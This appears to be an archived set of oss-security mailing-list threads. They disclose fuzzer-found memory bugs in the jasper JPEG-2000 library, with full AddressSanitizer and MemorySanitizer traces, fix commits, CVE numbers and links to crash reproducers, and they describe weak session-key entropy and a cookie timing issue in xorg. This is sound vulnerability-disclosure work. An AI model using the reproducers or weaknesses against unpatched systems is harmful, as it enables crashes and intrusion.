type = 0xff41 (UNKNOWN); len = 20;01 87 01 00 00 00 00 00 00 00 00 00 00 00 00 
00 00 00 warning: trailing garbage in marker segment (14 bytes)                                                                                                                                 
==7937==WARNING: MemorySanitizer: use-of-uninitialized-value                                                                                                                                                                                                                   
    #0 0x7fc562323907 in jpc_pi_nextcprl /tmp/portage/media-
libs/jasper-1.900.17/work/jasper-1.900.17/src/libjasper/jpc/jpc_t2cod.c:482:12                                                                                                                                     
    #1 0x7fc562323907 in jpc_pi_next /tmp/portage/media-
libs/jasper-1.900.17/work/jasper-1.900.17/src/libjasper/jpc/jpc_t2cod.c:125                                                                                                                                            
    #2 0x7fc56232aadc in jpc_dec_decodepkts /tmp/portage/media-
libs/jasper-1.900.17/work/jasper-1.900.17/src/libjasper/jpc/jpc_t2dec.c:441:14                                                                                                                                  
    #3 0x7fc5621fa9f1 in jpc_dec_process_sod /tmp/portage/media-
libs/jasper-1.900.17/work/jasper-1.900.17/src/libjasper/jpc/jpc_dec.c:594:6                                                                                                                                    
    #4 0x7fc56220c574 in jpc_dec_decode /tmp/portage/media-
libs/jasper-1.900.17/work/jasper-1.900.17/src/libjasper/jpc/jpc_dec.c:391:10                                                                                                                                        
    #5 0x7fc56220c574 in jpc_decode /tmp/portage/media-
libs/jasper-1.900.17/work/jasper-1.900.17/src/libjasper/jpc/jpc_dec.c:255                                                                                                                                               
    #6 0x7fc5621ac5a4 in jp2_decode /tmp/portage/media-
libs/jasper-1.900.17/work/jasper-1.900.17/src/libjasper/jp2/jp2_dec.c:215:21                                                                                                                                            
    #7 0x7fc5620d69d1 in jas_image_decode /tmp/portage/media-
libs/jasper-1.900.17/work/jasper-1.900.17/src/libjasper/base/jas_image.c:396:16                                                                                                                                   
    #8 0x557bb7618831 in main /tmp/portage/media-
libs/jasper-1.900.17/work/jasper-1.900.17/src/appl/imginfo.c:203:16                                                                                                                                                           
    #9 0x7fc5611e961f in __libc_start_main /var/tmp/portage/sys-
libs/glibc-2.22-r4/work/glibc-2.22/csu/libc-start.c:289                                                                                                                                                        
    #10 0x557bb7599a28 in _init (/usr/bin/imginfo+0x1aa28)                                                                                                                                                                                                                     
                                                                                                                                                                                                                                                                               
  Uninitialized value was created by a heap allocation                                                                                                                                                                                                                         
    #0 0x557bb75bf639 in malloc /var/tmp/portage/sys-devel/llvm-3.8.1-
r2/work/llvm-3.8.1.src/projects/compiler-rt/lib/msan/msan_interceptors.cc:1002                                                                                                                           
    #1 0x7fc5621507d4 in jas_malloc /tmp/portage/media-
libs/jasper-1.900.17/work/jasper-1.900.17/src/libjasper/base/jas_malloc.c:148:13                                                                                                                                        
    #2 0x7fc562152520 in jas_alloc2 /tmp/portage/media-
libs/jasper-1.900.17/work/jasper-1.900.17/src/libjasper/base/jas_malloc.c:275:9                                                                                                                                         
    #3 0x7fc56233360c in jpc_dec_pi_create /tmp/portage/media-
libs/jasper-1.900.17/work/jasper-1.900.17/src/libjasper/jpc/jpc_t2dec.c:506:30                                                                                                                                   
    #4 0x7fc5621f2c71 in jpc_dec_tileinit /tmp/portage/media-
libs/jasper-1.900.17/work/jasper-1.900.17/src/libjasper/jpc/jpc_dec.c:911:19                                                                                                                                      
    #5 0x7fc5621f2c71 in jpc_dec_process_sod /tmp/portage/media-
libs/jasper-1.900.17/work/jasper-1.900.17/src/libjasper/jpc/jpc_dec.c:560                                                                                                                                      
    #6 0x7fc56220c574 in jpc_dec_decode /tmp/portage/media-
libs/jasper-1.900.17/work/jasper-1.900.17/src/libjasper/jpc/jpc_dec.c:391:10                                                                                                                                        
    #7 0x7fc56220c574 in jpc_decode /tmp/portage/media-
libs/jasper-1.900.17/work/jasper-1.900.17/src/libjasper/jpc/jpc_dec.c:255                                                                                                                                               
    #8 0x7fc5621ac5a4 in jp2_decode /tmp/portage/media-
libs/jasper-1.900.17/work/jasper-1.900.17/src/libjasper/jp2/jp2_dec.c:215:21                                                                                                                                            
    #9 0x7fc5620d69d1 in jas_image_decode /tmp/portage/media-
libs/jasper-1.900.17/work/jasper-1.900.17/src/libjasper/base/jas_image.c:396:16                                                                                                                                   
    #10 0x557bb7618831 in main /tmp/portage/media-
libs/jasper-1.900.17/work/jasper-1.900.17/src/appl/imginfo.c:203:16                                                                                                                                                          
    #11 0x7fc5611e961f in __libc_start_main /var/tmp/portage/sys-
libs/glibc-2.22-r4/work/glibc-2.22/csu/libc-start.c:289                                                                                                                                                       
                                                                                                                                                                                                                                                                               
SUMMARY: MemorySanitizer: use-of-uninitialized-value /tmp/portage/media-
libs/jasper-1.900.17/work/jasper-1.900.17/src/libjasper/jpc/jpc_t2cod.c:482:12 
in jpc_pi_nextcprl                                                                                                      
Exiting

Affected version:
1.900.17

Fixed version:
1.900.20

Commit fix:
https://github.com/mdadams/jasper/commit/1f0dfe5a42911b6880a1445f13f6d615ddb55387

Credit:
This bug was discovered by Agostino Sarubbo of Gentoo.

CVE:
N/A

Reproducer:
https://github.com/asarubbo/poc/blob/master/00029-jasper-uninitvalue-jpc_pi_nextcprl

Timeline:
2016-11-03: bug discovered and reported to upstream
2016-11-04: upstream released a patch
2016-11-04: blog post about the issue

Note:
This bug was found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2016/11/04/jasper-use-of-uninitialized-value-in-jpc_pi_nextcprl-jpc_t2cod-c

```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489401675.10063_1.Morbo,U=41388:2,T -->

##### Agostino Sarubbo <ago@gentoo.org>, `26134027.ubZr3Z7UH6@blackgate`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
On Friday 04 November 2016 15:43:31 Agostino Sarubbo 
wrote:
> Permalink:
> https://blogs.gentoo.org/ago/2016/11/04/jasper-use-of-uninitialized-value-in
> -jpc_pi_nextcprl-jpc_t2cod-c

This is CVE-2016-10251

-- 
Agostino Sarubbo
Gentoo Linux Developer


```

</details>

---

</details>
<details>
<summary><strong>[oss-security] jasper: NULL pointer dereference in jp2_colr_destroy (jp2_cod.c) (incomplete fix for CVE-2016-8887)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1478046455.4479_16075.NdNdNx,U=15411:2, -->

##### Agostino Sarubbo <ago@gentoo.org>, `1686747.IoBOjVF1Mp@arcadia`

```
Description:
jasper is an open-source initiative to provide a free software-based reference 
implementation of the codec specified in the JPEG-2000 Part-1 standard.

Another round of fuzzing on an updated version (1.900.10) revealed that the 
NULL pointer access identified as CVE-2016-8887 which upstream declared to be 
fixed in the version 1.900.10 is still here.

The complete ASan output:

# imginfo -f $FILE
ASAN:DEADLYSIGNAL
=================================================================
==20885==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 
0x00000041defd bp 0xbebebebebebebebe sp 0x7ffc4e4a4550 T0)
    #0 0x41defc in atomic_compare_exchange_strong /var/tmp/portage/sys-
devel/llvm-3.8.1-r2/work/llvm-3.8.1.src/projects/compiler-
rt/lib/asan/../sanitizer_common/sanitizer_atomic_clang.h:81
    #1 0x41defc in 
__asan::Allocator::AtomicallySetQuarantineFlag(__asan::AsanChunk*, void*, 
__sanitizer::BufferedStackTrace*) /var/tmp/portage/sys-devel/llvm-3.8.1-
r2/work/llvm-3.8.1.src/projects/compiler-rt/lib/asan/asan_allocator.cc:465
    #2 0x41defc in __asan::Allocator::Deallocate(void*, unsigned long, 
__sanitizer::BufferedStackTrace*, __asan::AllocType) /var/tmp/portage/sys-
devel/llvm-3.8.1-r2/work/llvm-3.8.1.src/projects/compiler-
rt/lib/asan/asan_allocator.cc:525
    #3 0x41defc in __asan::asan_free(void*, __sanitizer::BufferedStackTrace*, 
__asan::AllocType) /var/tmp/portage/sys-devel/llvm-3.8.1-
r2/work/llvm-3.8.1.src/projects/compiler-rt/lib/asan/asan_allocator.cc:709
    #4 0x4c008c in free /var/tmp/portage/sys-devel/llvm-3.8.1-
r2/work/llvm-3.8.1.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:41
    #5 0x7faeeeb2d430 in jp2_colr_destroy /tmp/portage/media-
libs/jasper-1.900.10/work/jasper-1.900.10/src/libjasper/jp2/jp2_cod.c:450:3
    #6 0x7faeeeb32b0e in jp2_box_destroy /tmp/portage/media-
libs/jasper-1.900.10/work/jasper-1.900.10/src/libjasper/jp2/jp2_cod.c:211:3
    #7 0x7faeeeb32b0e in jp2_box_get /tmp/portage/media-
libs/jasper-1.900.10/work/jasper-1.900.10/src/libjasper/jp2/jp2_cod.c:314
    #8 0x7faeeeb369a0 in jp2_decode /tmp/portage/media-
libs/jasper-1.900.10/work/jasper-1.900.10/src/libjasper/jp2/jp2_dec.c:156:16
    #9 0x7faeeeac6a29 in jas_image_decode /tmp/portage/media-
libs/jasper-1.900.10/work/jasper-1.900.10/src/libjasper/base/jas_image.c:392:16
    #10 0x4f1686 in main /tmp/portage/media-
libs/jasper-1.900.10/work/jasper-1.900.10/src/appl/imginfo.c:188:16
    #11 0x7faeedbd361f in __libc_start_main /var/tmp/portage/sys-
libs/glibc-2.22-r4/work/glibc-2.22/csu/libc-start.c:289
    #12 0x418e68 in _init (/usr/bin/imginfo+0x418e68)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /var/tmp/portage/sys-devel/llvm-3.8.1-
r2/work/llvm-3.8.1.src/projects/compiler-
rt/lib/asan/../sanitizer_common/sanitizer_atomic_clang.h:81 in 
atomic_compare_exchange_strong
==20885==ABORTING

Affected version:
1.900.10

Fixed version:
N/A

Commit fix:
N/A

Credit:
This bug was discovered by Agostino Sarubbo of Gentoo.

CVE:
N/A

Reproducer:
https://github.com/asarubbo/poc/blob/master/00002-jasper-NULLptr-jp2_colr_destroy

Timeline:
2016-10-22: bug re-discovered
2016-10-22: bug re-reported to upstream
2016-10-23: blog post about the issue

Note:
This bug was found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2016/10/23/jasper-null-pointer-dereference-in-jp2_colr_destroy-jp2_cod-c-incomplete-fix-for-cve-2016-8887


-- 
Agostino Sarubbo
Gentoo Linux Developer

```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489401556.9959_1.Morbo,U=41385:2, -->

##### Agostino Sarubbo <ago@gentoo.org>, `4129940.EKXfKyb2vO@blackgate`

```
On Sunday 23 October 2016 09:58:37 Agostino Sarubbo wrote:
> Permalink:
> https://blogs.gentoo.org/ago/2016/10/23/jasper-null-pointer-dereference-in-j
> p2_colr_destroy-jp2_cod-c-incomplete-fix-for-cve-2016-8887

This is CVE-2016-10250

-- 
Agostino Sarubbo
Gentoo Linux Developer

```

</details>
<details>
<summary><strong>[oss-security] jasper: heap-based buffer overflow in jpc_dec_tiledecode (jpc_dec.c)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1478046455.4479_16076.NdNdNx,U=15412:2, -->

##### Agostino Sarubbo <ago@gentoo.org>, `295468895.Z3kUJlH9qt@arcadia`

```
Description:
jasper is an open-source initiative to provide a free software-based reference 
implementation of the codec specified in the JPEG-2000 Part-1 standard.

Another round of fuzzing on an updated version (1.900.10) a buffer over read 
because of an integer overflow.

The complete ASan output:

# imginfo -f $FILE
warning: not enough tile data (9 bytes)                                                                                                                                                        
=================================================================                                                                                                                              
==15870==ERROR: AddressSanitizer: heap-buffer-overflow on address 
0x7f0c6a964770 at pc 0x7f0c729e93a4 bp 0x7ffd08758cf0 sp 0x7ffd08758ce8                                                      
READ of size 8 at 0x7f0c6a964770 thread T0                                                                                                                                                     
    #0 0x7f0c729e93a3 in jpc_dec_tiledecode /tmp/portage/media-
libs/jasper-1.900.10/work/jasper-1.900.10/src/libjasper/jpc/jpc_dec.c:1126:43                                                   
    #1 0x7f0c729d9567 in jpc_dec_process_eoc /tmp/portage/media-
libs/jasper-1.900.10/work/jasper-1.900.10/src/libjasper/jpc/jpc_dec.c:1170:8                                                   
    #2 0x7f0c729e20c4 in jpc_dec_decode /tmp/portage/media-
libs/jasper-1.900.10/work/jasper-1.900.10/src/libjasper/jpc/jpc_dec.c:390:10                                                        
    #3 0x7f0c729e20c4 in jpc_decode /tmp/portage/media-
libs/jasper-1.900.10/work/jasper-1.900.10/src/libjasper/jpc/jpc_dec.c:254                                                               
    #4 0x7f0c729afc41 in jp2_decode /tmp/portage/media-
libs/jasper-1.900.10/work/jasper-1.900.10/src/libjasper/jp2/jp2_dec.c:215:21                                                            
    #5 0x7f0c7293fa29 in jas_image_decode /tmp/portage/media-
libs/jasper-1.900.10/work/jasper-1.900.10/src/libjasper/base/jas_image.c:392:16                                                   
    #6 0x4f1686 in main /tmp/portage/media-
libs/jasper-1.900.10/work/jasper-1.900.10/src/appl/imginfo.c:188:16                                                                                 
    #7 0x7f0c71a4c61f in __libc_start_main /var/tmp/portage/sys-
libs/glibc-2.22-r4/work/glibc-2.22/csu/libc-start.c:289                                                                        
    #8 0x418e68 in _init (/usr/bin/imginfo+0x418e68)                                                                                                                                           

0x7f0c6a964770 is located 0 bytes to the right of 64749424-byte region 
[0x7f0c66ba4800,0x7f0c6a964770)                                                                                         
allocated by thread T0 here:                                                                                                                                                                   
    #0 0x4c03b8 in malloc /var/tmp/portage/sys-devel/llvm-3.8.1-
r2/work/llvm-3.8.1.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:52                                                   
    #1 0x7f0c7297efbe in jas_malloc /tmp/portage/media-
libs/jasper-1.900.10/work/jasper-1.900.10/src/libjasper/base/jas_malloc.c:105:11                                                        
    #2 0x7f0c7297efbe in jas_alloc2 /tmp/portage/media-
libs/jasper-1.900.10/work/jasper-1.900.10/src/libjasper/base/jas_malloc.c:136                                                           
    #3 0x7f0c7297fb44 in jas_matrix_create /tmp/portage/media-
libs/jasper-1.900.10/work/jasper-1.900.10/src/libjasper/base/jas_seq.c:129:25                                                    
    #4 0x7f0c7297f71b in jas_seq2d_create /tmp/portage/media-
libs/jasper-1.900.10/work/jasper-1.900.10/src/libjasper/base/jas_seq.c:90:17                                                      
    #5 0x7f0c729d4280 in jpc_dec_tileinit /tmp/portage/media-
libs/jasper-1.900.10/work/jasper-1.900.10/src/libjasper/jpc/jpc_dec.c:702:23                                                      
    #6 0x7f0c729d4280 in jpc_dec_process_sod /tmp/portage/media-
libs/jasper-1.900.10/work/jasper-1.900.10/src/libjasper/jpc/jpc_dec.c:559                                                      
    #7 0x7f0c729e20c4 in jpc_dec_decode /tmp/portage/media-
libs/jasper-1.900.10/work/jasper-1.900.10/src/libjasper/jpc/jpc_dec.c:390:10                                                        
    #8 0x7f0c729e20c4 in jpc_decode /tmp/portage/media-
libs/jasper-1.900.10/work/jasper-1.900.10/src/libjasper/jpc/jpc_dec.c:254                                                               
    #9 0x7f0c729afc41 in jp2_decode /tmp/portage/media-
libs/jasper-1.900.10/work/jasper-1.900.10/src/libjasper/jp2/jp2_dec.c:215:21                                                            
    #10 0x7f0c7293fa29 in jas_image_decode /tmp/portage/media-
libs/jasper-1.900.10/work/jasper-1.900.10/src/libjasper/base/jas_image.c:392:16                                                  
    #11 0x4f1686 in main /tmp/portage/media-
libs/jasper-1.900.10/work/jasper-1.900.10/src/appl/imginfo.c:188:16
    #12 0x7f0c71a4c61f in __libc_start_main /var/tmp/portage/sys-
libs/glibc-2.22-r4/work/glibc-2.22/csu/libc-start.c:289

SUMMARY: AddressSanitizer: heap-buffer-overflow /tmp/portage/media-
libs/jasper-1.900.10/work/jasper-1.900.10/src/libjasper/jpc/jpc_dec.c:1126:43 
in jpc_dec_tiledecode
Shadow bytes around the buggy address:
  0x0fe20d524890: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fe20d5248a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fe20d5248b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fe20d5248c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fe20d5248d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0fe20d5248e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00[fa]fa
  0x0fe20d5248f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0fe20d524900: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0fe20d524910: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0fe20d524920: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0fe20d524930: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==15870==ABORTING

Affected version:
1.900.10

Fixed version:
1.900.12

Commit fix:
https://github.com/mdadams/jasper/commit/988f8365f7d8ad8073b6786e433d34c553ecf568

Credit:
This bug was discovered by Agostino Sarubbo of Gentoo.

CVE:
N/A

Reproducer:
https://github.com/asarubbo/poc/blob/master/00001-jasper-heapoverflow-jpc_dec_tiledecode

Timeline:
2016-10-22: bug discovered
2016-10-22: bug reported to upstream
2016-10-22: upstream released the patch
2016-10-23: upstream released 1.900.12
2016-10-23: blog post about the issue

Note:
This bug was found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2016/10/23/jasper-heap-based-buffer-overflow-in-jpc_dec_tiledecode-jpc_dec-c/


-- 
Agostino Sarubbo
Gentoo Linux Developer

```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489401398.9843_1.Morbo,U=41381:2, -->

##### Agostino Sarubbo <ago@gentoo.org>, `4644054.hoH7EUZc3H@blackgate`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
On Sunday 23 October 2016 10:01:07 Agostino Sarubbo 
wrote:
> Permalink:
> https://blogs.gentoo.org/ago/2016/10/23/jasper-heap-based-buffer-overflow-in
> -jpc_dec_tiledecode-jpc_dec-c/

This is CVE-2016-10249

-- 
Agostino Sarubbo
Gentoo Linux Developer


```

</details>

---

</details>
<details>
<summary><strong>[oss-security] jasper: NULL pointer dereference in jpc_tsfb_synthesize (jpc_tsfb.c)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1478046453.4479_15943.NdNdNx,U=15279:2, -->

##### Agostino Sarubbo <ago@gentoo.org>, `5184269.v1vKSl7Lqd@blackgate`

```
Description:
jasper is an open-source initiative to provide a free software-based reference 
implementation of the codec specified in the JPEG-2000 Part-1 standard.

Another round of fuzzing on an updated version (1.900.5) revealed another NULL 
pointer access

The complete ASan output:

# imginfo -f $FILE
warning: trailing garbage in marker segment (14 bytes)
warning: not enough tile data (15 bytes)
warning: bad segmentation symbol
warning: bad segmentation symbol
ASAN:DEADLYSIGNAL
=================================================================
==7144==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 
0x7f6d3c37d0b0 bp 0x7ffdc7407a90 sp 0x7ffdc7407a30 T0)
    #0 0x7f6d3c37d0af in jpc_tsfb_synthesize /tmp/portage/media-
libs/jasper-1.900.5/work/jasper-1.900.5/src/libjasper/jpc/jpc_tsfb.c:152:4
    #1 0x7f6d3c2f5140 in jpc_dec_tiledecode /tmp/portage/media-
libs/jasper-1.900.5/work/jasper-1.900.5/src/libjasper/jpc/jpc_dec.c:1068:3
    #2 0x7f6d3c2e5c40 in jpc_dec_process_sod /tmp/portage/media-
libs/jasper-1.900.5/work/jasper-1.900.5/src/libjasper/jpc/jpc_dec.c:623:7
    #3 0x7f6d3c2ef294 in jpc_dec_decode /tmp/portage/media-
libs/jasper-1.900.5/work/jasper-1.900.5/src/libjasper/jpc/jpc_dec.c:390:10
    #4 0x7f6d3c2ef294 in jpc_decode /tmp/portage/media-
libs/jasper-1.900.5/work/jasper-1.900.5/src/libjasper/jpc/jpc_dec.c:254
    #5 0x7f6d3c2bd061 in jp2_decode /tmp/portage/media-
libs/jasper-1.900.5/work/jasper-1.900.5/src/libjasper/jp2/jp2_dec.c:215:21
    #6 0x7f6d3c24df39 in jas_image_decode /tmp/portage/media-
libs/jasper-1.900.5/work/jasper-1.900.5/src/libjasper/base/jas_image.c:380:16
    #7 0x4f1686 in main /tmp/portage/media-
libs/jasper-1.900.5/work/jasper-1.900.5/src/appl/imginfo.c:188:16
    #8 0x7f6d3b35c61f in __libc_start_main /var/tmp/portage/sys-
libs/glibc-2.22-r4/work/glibc-2.22/csu/libc-start.c:289                                                                                                                                                        
    #9 0x418e68 in _init (/usr/bin/imginfo+0x418e68)                                                                                                                                                                                                                           

AddressSanitizer can not provide additional info.                                                                                                                                                                                                                              
SUMMARY: AddressSanitizer: SEGV /tmp/portage/media-
libs/jasper-1.900.5/work/jasper-1.900.5/src/libjasper/jpc/jpc_tsfb.c:152:4 in 
jpc_tsfb_synthesize                                                                                                                           
==7144==ABORTING

Affected version:
1.900.5

Fixed version:
1.900.9

Commit fix:
https://github.com/mdadams/jasper/commit/2e82fa00466ae525339754bb3ab0a0474a31d4bd

Credit:
This bug was discovered by Agostino Sarubbo of Gentoo.

CVE:
N/A

Timeline:
2016-10-19: bug discovered
2016-10-19: bug reported to upstream
2016-10-20: upstream released the patch and 1.900.9
2016-10-20: blog post about the issue

Note:
This bug was found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2016/10/20/jasper-null-pointer-dereference-in-jpc_tsfb_synthesize-jpc_tsfb-c/


```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489401199.9693_1.Morbo,U=41379:2, -->

##### Agostino Sarubbo <ago@gentoo.org>, `2036100.Yz5vC6aIUd@blackgate`

```
On Thursday 20 October 2016 09:43:40 Agostino Sarubbo wrote:
> Permalink:
> https://blogs.gentoo.org/ago/2016/10/20/jasper-null-pointer-dereference-in-j
> pc_tsfb_synthesize-jpc_tsfb-c/

This is CVE-2016-10248

-- 
Agostino Sarubbo
Gentoo Linux Developer

```

</details>
<details>
<summary><strong>[oss-security] Re: JasPer 2.0.12 NULL Pointer Dereference jp2_encode (jp2_enc.c)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488798316.22694_5.Morbo,U=39528:2, -->

##### Anthony Sasadeusz <sasadeu1@umbc.edu>, `CAH468doehvXuMkgF3caMFmia4K+dXJp5=6JFRTrkNGkHFiNoow@mail.gmail.com`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
admin@ip-172-31-13-10:~/jasper/build-asan/src/appl$ ./jasper --input
../../../build-afl/src/appl/findings/crashes/id\:000000\,sig\:11\,src\:000002\,op\:havoc\,rep\:16
--output /dev/null --output-format jp2
ASAN:SIGSEGV
=================================================================
==16088==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000
(pc 0x7f45f3104fe6 sp 0x7ffcd24052c0 bp 0x7ffcd24063d0 T0)
    #0 0x7f45f3104fe5 in jp2_encode
/home/admin/jasper/src/libjasper/jp2/jp2_enc.c:119
    #1 0x7f45f30de187 in jas_image_encode
/home/admin/jasper/src/libjasper/base/jas_image.c:471
    #2 0x402494 in main /home/admin/jasper/src/appl/jasper.c:277
    #3 0x7f45f2a1eb44 in __libc_start_main
(/lib/x86_64-linux-gnu/libc.so.6+0x21b44)
    #4 0x401908 (/home/admin/jasper/build-asan/src/appl/jasper+0x401908)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV
/home/admin/jasper/src/libjasper/jp2/jp2_enc.c:119 jp2_encode
==16088==ABORTING


This also happens on the latest master branch.
The repo: https://github.com/mdadams/jasper

Crashing inputs found with afl:
https://github.com/nullsector/jasper-fuzz/tree/master/testcases/crashes


```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488798317.22694_7.Morbo,U=39530:2, -->

##### Emilio Pozuelo Monfort <pochu27@gmail.com>, `57f09f12-2cf9-a77b-86d9-1f981fc10930@gmail.com`

```
On 06/03/17 03:16, Anthony Sasadeusz wrote:
> admin@ip-172-31-13-10:~/jasper/build-asan/src/appl$ ./jasper --input
> ../../../build-afl/src/appl/findings/crashes/id\:000000\,sig\:11\,src\:000002\,op\:havoc\,rep\:16
> --output /dev/null --output-format jp2
> ASAN:SIGSEGV
> =================================================================
> ==16088==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000
> (pc 0x7f45f3104fe6 sp 0x7ffcd24052c0 bp 0x7ffcd24063d0 T0)
>     #0 0x7f45f3104fe5 in jp2_encode
> /home/admin/jasper/src/libjasper/jp2/jp2_enc.c:119
>     #1 0x7f45f30de187 in jas_image_encode
> /home/admin/jasper/src/libjasper/base/jas_image.c:471
>     #2 0x402494 in main /home/admin/jasper/src/appl/jasper.c:277
>     #3 0x7f45f2a1eb44 in __libc_start_main
> (/lib/x86_64-linux-gnu/libc.so.6+0x21b44)
>     #4 0x401908 (/home/admin/jasper/build-asan/src/appl/jasper+0x401908)
> 
> AddressSanitizer can not provide additional info.
> SUMMARY: AddressSanitizer: SEGV
> /home/admin/jasper/src/libjasper/jp2/jp2_enc.c:119 jp2_encode
> ==16088==ABORTING
> 
> 
> This also happens on the latest master branch.
> The repo: https://github.com/mdadams/jasper
> 
> Crashing inputs found with afl:
> https://github.com/nullsector/jasper-fuzz/tree/master/testcases/crashes

You should request CVEs at http://cveform.mitre.org/ these days.

Also it'd be good if you opened an upstream bug report about this.

Cheers,
Emilio

```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488811213.6489_1.Morbo,U=39699:2, -->

##### Tomas Hoger <thoger@redhat.com>, `20170306153855.7eb0672f@redhat.com`

```
On Mon, 6 Mar 2017 09:06:00 +0100 Emilio Pozuelo Monfort wrote:

> > This also happens on the latest master branch.
> > The repo: https://github.com/mdadams/jasper
> > 
> > Crashing inputs found with afl:
> > https://github.com/nullsector/jasper-fuzz/tree/master/testcases/crashes  
> 
> You should request CVEs at http://cveform.mitre.org/ these days.
> 
> Also it'd be good if you opened an upstream bug report about this.

Looks like that was already done:

https://github.com/mdadams/jasper/issues/120

-- 
Tomas Hoger / Red Hat Product Security

```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488887111.12273_14.Morbo,U=40024:2, -->

##### Anthony Sasadeusz <sasadeu1@umbc.edu>, `CAH468dos8V4PXioySSBW1hR0Nm5-Bd007HmrSLwE=yKakzOmbg@mail.gmail.com`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Reference: http://www.openwall.com/lists/oss-security/2017/03/06/1

Fixed in the following commit:
https://github.com/mdadams/jasper/commit/58ba0365d911b9f9dd68e9abf826682c0b4f2293

Thanks,

Anthony


```

</details>

---

</details>

## xorg
<details>
<summary><strong>[oss-security] Re: three issues in xorg (CVE-*2017*-2624, CVE-*2017*-2625, CVE-*2017*-2626)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488379285.2379_227.Morbo,U=38066:2, -->

##### Doran Moppert <dmoppert@redhat.com>, `20170301003129.GB4851@sin.redhat.com`

```
Vulnerabilities in xorg (server, libXdmcp, libICE) were recently
reported by Eric Sesterhenn of X41, and assigned CVEs by Red Hat.


> CVE-2017-2624 xorg-x11-server: timing attack against MIT Cookie

mitauth.c uses memcmp() to check the validity of MIT cookies, exposing a
possible timing attack on some platforms.

https://bugzilla.redhat.com/show_bug.cgi?id=1424984
http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=856398
https://bugzilla.novell.com/show_bug.cgi?id=1025029


> CVE-2017-2625 libXdmcp: weak entropy usage for session keys

In the absence of arc4random(), xdmcp session keys are generated based
on getpid() and time(), which may allow a local attacker to brute-force
the key.

https://bugzilla.redhat.com/show_bug.cgi?id=1424987
http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=856399
https://bugzilla.novell.com/show_bug.cgi?id=1025046


> CVE-2017-2626 libICE: weak entropy usage in session keys

In the absence of arc4random(), the Inter-Client Exchange session keys
are generated based on gettimeofday(), which may allow a local attacker
to brute-force the key.

https://bugzilla.redhat.com/show_bug.cgi?id=1424992
http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=856400
https://bugzilla.novell.com/show_bug.cgi?id=1025068


The first issue is mitigated with recent glibc's memcmp, particularly
with -D_FORTIFY_SOURCE=2, and the other two by providing an
implementation of arc4random at compile time, such as libbsd.

I expect these to be announced shortly at
<https://www.x.org/wiki/Development/Security/>.



-- 
Doran Moppert
Red Hat Product Security

```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488379285.2379_228.Morbo,U=38067:2, -->

##### Doran Moppert <dmoppert@redhat.com>, `20170301003700.GC4851@sin.redhat.com`

```
Of course, the subject should have read 2017 where it read 2016 ..

-- 
Doran Moppert
Red Hat Product Security

```

</details>
<details>
<summary><strong>[oss-security] Advisory X41-2017-001: Multiple Vulnerabilities in X.org</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488379282.2379_133.Morbo,U=37972:2, -->

##### X41 D-Sec GmbH Advisories <advisories@x41-dsec.de>, `02cb8961-7fc2-7f7f-4924-40c5c8f61829@x41-dsec.de`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```

```

</details>
<details><summary>Additional Parts</summary>

```
